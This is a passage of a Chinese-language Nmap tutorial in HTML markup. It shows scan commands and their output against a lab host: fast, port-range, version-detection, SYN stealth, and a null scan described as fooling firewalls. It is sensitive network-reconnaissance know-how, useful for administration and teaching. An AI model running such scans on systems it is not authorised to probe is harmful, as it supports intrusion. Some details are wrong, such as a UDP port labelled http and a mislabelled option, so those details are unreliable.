class="keyword">up</span>.</span><br><span class="line">Host server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>) appears <span class="keyword">to</span> <span class="keyword">be</span> <span class="keyword">up</span>.</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line">Nmap finished: <span class="number">256</span> IP addresses (<span class="number">2</span> hosts <span class="keyword">up</span>) scanned in <span class="number">5.109</span> seconds</span><br></pre></td></tr></table></figure><h3 id="14-执行快速扫描-F"><a href="#14-执行快速扫描-F" class="headerlink" title="14.执行快速扫描-F"></a>14.执行快速扫描-F</h3><p>你可以使用“<strong>-F</strong>”选项执行一次快速扫描，仅扫描列在nmap-services文件中的端口而避开所有其它的端口。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -F <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">47</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1234</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.322</span> seconds</span><br></pre></td></tr></table></figure><h3 id="15-查看Nmap的版本"><a href="#15-查看Nmap的版本" class="headerlink" title="15.查看Nmap的版本"></a>15.查看Nmap的版本</h3><p>你可以使用“<strong>-V</strong>”选项来检测你机子上Nmap的版本。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]<span class="comment"># nmap -V</span></span><br><span class="line"> </span><br><span class="line">Nmap version <span class="number">4.11</span> ( http:<span class="regexp">//</span>www.insecure.org<span class="regexp">/nmap/</span> )</span><br><span class="line">You have new mail <span class="keyword">in</span> <span class="regexp">/var/</span>spool<span class="regexp">/mail/</span>root</span><br></pre></td></tr></table></figure><h3 id="16-顺序扫描端口-r"><a href="#16-顺序扫描端口-r" class="headerlink" title="16.顺序扫描端口-r"></a>16.顺序扫描端口-r</h3><p>使用“-r”选项表示不会随机的选择端口扫描。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -r <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">52</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.363</span> seconds</span><br></pre></td></tr></table></figure><h3 id="17-打印主机接口和路由-iflist"><a href="#17-打印主机接口和路由-iflist" class="headerlink" title="17.打印主机接口和路由-iflist"></a>17.打印主机接口和路由-iflist</h3><p>你可以使用nmap的“<strong>–iflist</strong>”选项检测主机接口和路由信息。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap --iflist</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 17:07 EST</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">****INTERFACES**</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>**</span><br><span class="line">DEV  (SHORT) IP/MASK          TYPE     UP MAC</span><br><span class="line">lo   (lo)    127.0.0.1/8      loopback up</span><br><span class="line">eth0 (eth0)  192.168.0.100/24 ethernet up 08:00:27:11:C7:89</span><br><span class="line"> </span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="emphasis">*ROUTES*</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span></span><br><span class="line">DST/MASK      DEV  GATEWAY</span><br><span class="line">192.168.0.0/0 eth0</span><br><span class="line">169.254.0.0/0 eth0</span><br></pre></td></tr></table></figure><p>从上面的输出你可以看到，nmap列举出了你系统上的接口以及它们各自的路由信息。</p><h3 id="18-扫描特定的端口-p"><a href="#18-扫描特定的端口-p" class="headerlink" title="18.扫描特定的端口-p"></a>18.扫描特定的端口-p</h3><p>使用Nmap扫描远程机器的端口有各种选项，你可以使用“-<strong>p</strong>”选项指定你想要扫描的端口，默认情况下nmap只扫描<strong>TCP</strong>端口。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -<span class="keyword">p</span> <span class="number">80</span> server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">12</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) sca</span><br></pre></td></tr></table></figure><h3 id="19-扫描TCP端口-p-T"><a href="#19-扫描TCP端口-p-T" class="headerlink" title="19.扫描TCP端口-p T:"></a>19.扫描TCP端口-p T:</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -<span class="keyword">p</span> T:<span class="number">8888</span>,<span class="number">80</span> server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">15</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.157</span> seconds</span><br></pre></td></tr></table></figure><h3 id="20-扫描UDP端口-sU"><a href="#20-扫描UDP端口-sU" class="headerlink" title="20.扫描UDP端口-sU"></a>20.扫描UDP端口-sU</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sU <span class="number">53</span> server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">15</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">53</span>/udp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">8888</span>/udp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.157</span> seconds</span><br></pre></td></tr></table></figure><h3 id="21-扫描多个端口"><a href="#21-扫描多个端口" class="headerlink" title="21.扫描多个端口"></a>21.扫描多个端口</h3><p>你还可以使用选项“-<strong>P</strong>”来扫描多个端口。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -p <span class="number">80</span>,<span class="number">443</span> <span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) <span class="meta">at</span> <span class="number">2013</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">10</span>:<span class="number">56</span> EST</span><br><span class="line">Interesting ports on server2.tecmint.com (<span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span>):</span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line"><span class="number">80</span>/tcp  open   http</span><br><span class="line"><span class="number">443</span>/tcp closed https</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> <span class="built_in">IP</span> address (<span class="number">1</span> host <span class="meta">up</span>) scanned <span class="keyword">in</span> <span class="number">0.190</span> seconds</span><br></pre></td></tr></table></figure><h3 id="22-扫描指定范围内的端口"><a href="#22-扫描指定范围内的端口" class="headerlink" title="22.扫描指定范围内的端口"></a>22.扫描指定范围内的端口</h3><p>您可以使用表达式来扫描某个范围内的端口。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]#  nmap -p <span class="number">80</span><span class="number">-160</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.101</span></span><br></pre></td></tr></table></figure><h3 id="23-查找主机服务版本号-sV"><a href="#23-查找主机服务版本号-sV" class="headerlink" title="23.查找主机服务版本号-sV"></a>23.查找主机服务版本号-sV</h3><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sV <span class="number">192.168</span><span class="number">.0</span><span class="number">.101</span></span><br><span class="line"> </span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) at <span class="number">2013</span><span class="number">-11</span><span class="number">-11</span> <span class="number">17</span>:<span class="number">48</span> <span class="type">EST</span></span><br><span class="line"><span class="type">Interesting</span> ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.2.3 ((<span class="type">CentOS</span>))</span><br><span class="line">111/tcp  open  rpcbind  2 (rpc #100000)</span><br><span class="line">957/tcp  open  status   1 (rpc #100024)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    lighttpd 1.4.32</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (<span class="type">Cadmus</span> <span class="type">Computer</span> <span class="type">Systems</span>)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 12.624 seconds</span><br></pre></td></tr></table></figure><h3 id="24-使用TCP-ACK-PA-和TCP-Syn-PS-扫描远程主机"><a href="#24-使用TCP-ACK-PA-和TCP-Syn-PS-扫描远程主机" class="headerlink" title="24.使用TCP ACK (-PA)和TCP Syn (-PS)扫描远程主机"></a>24.使用TCP ACK (-PA)和TCP Syn (-PS)扫描远程主机</h3><p>有时候包过滤防火墙会阻断标准的ICMP ping请求，在这种情况下，我们可以使用<strong>TCP ACK</strong>和<strong>TCP Syn</strong>（tcp探测扫描）方法来扫描远程主机。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PS <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">51</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.360</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="25-使用TCP-ACK扫描远程主机上特定的端口-PA-p"><a href="#25-使用TCP-ACK扫描远程主机上特定的端口-PA-p" class="headerlink" title="25.使用TCP ACK扫描远程主机上特定的端口-PA -p"></a>25.使用TCP ACK扫描远程主机上特定的端口-PA -p</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PA -<span class="keyword">p</span> <span class="number">22</span>,<span class="number">80</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">02</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.166</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="26-使用TCP-Syn扫描远程主机上特定的端口"><a href="#26-使用TCP-Syn扫描远程主机上特定的端口" class="headerlink" title="26. 使用TCP Syn扫描远程主机上特定的端口"></a>26. 使用TCP Syn扫描远程主机上特定的端口</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PS -<span class="keyword">p</span> <span class="number">22</span>,<span class="number">80</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">08</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.165</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="27-执行一次隐蔽的扫描-sS"><a href="#27-执行一次隐蔽的扫描-sS" class="headerlink" title="27.执行一次隐蔽的扫描-sS"></a>27.执行一次隐蔽的扫描-sS</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sS <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">10</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.383</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="28-使用TCP-Syn扫描最常用的端口-sT"><a href="#28-使用TCP-Syn扫描最常用的端口-sT" class="headerlink" title="28.使用TCP Syn扫描最常用的端口-sT"></a>28.使用TCP Syn扫描最常用的端口-sT</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sT <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">12</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.406</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="29-执行TCP空扫描以骗过防火墙-sN"><a href="#29-执行TCP空扫描以骗过防火墙-sN" class="headerlink" title="29.执行TCP空扫描以骗过防火墙-sN"></a>29.执行TCP空扫描以骗过防火墙-sN</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -<span class="keyword">sN</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">19</span>:<span class="number">01</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE         SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>|filtered ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>|filtered http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>|filtered rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>|filtered unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>|filtered mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>|filtered <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">1.584</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="指令分类"><a href="#指令分类" class="headerlink" title="指令分类"></a>指令分类</h3><h4 id="初级使用"><a href="#初级使用" class="headerlink" title="初级使用"></a>初级使用</h4><p>nmap -v scanme.nmap.org</p><p>这个选项扫描主机scanme.nmap.org中所有的保留TCP端口。选项-v启用细节模式。</p><p>nmap -A -T4 scanme.nmap.org</p><p>-A用来进行操作系统及其版本的探测，-T4 可以加快执行速度</p><p>nmap -sS -O scanme.nmap.org/24</p><p>进行秘密SYN扫描，对象为主机Saznme所在的“C类”网段的255台主机。同时尝试确定每台工作主机的操作系统类型。因为进行SYN扫描 